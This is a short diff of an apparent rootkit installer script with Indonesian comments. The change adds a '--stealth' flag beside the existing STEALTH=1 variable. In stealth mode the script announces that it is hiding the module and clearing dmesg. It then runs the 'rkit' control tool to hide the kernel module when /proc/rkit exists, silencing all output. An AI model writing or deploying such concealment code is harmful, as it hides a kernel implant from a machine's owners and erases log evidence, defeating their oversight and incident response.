@@ -216,10 +216,10 @@ else
 	fi
 fi
 
-# ----------------10. stealth opsional (STEALTH=1) ----------------
-# pakai: sudo STEALTH=1 sh install.sh
-# tanpa env ini blok ini TIDAK jalan (install biasa, persis seperti dulu)
-if [ "${STEALTH:-0}" = "1" ]; then
+# ----------------10. stealth opsional (--stealth) ----------------
+# pakai: sudo sh install.sh --stealth     (alias: sudo STEALTH=1 sh install.sh)
+# tanpa flag ini blok ini TIDAK jalan (install biasa, persis seperti dulu)
+if [ "${STEALTH:-0}" = "1" ] || [ "${1:-}" = "--stealth" ]; then
 	echo "[*] STEALTH=1 — menyembunyikan modul + membersihkan dmesg"
 	if [ -e /proc/rkit ]; then
 		"$ROOT/control/cli/rkit" hide mod >/dev/null 2>&1 || true
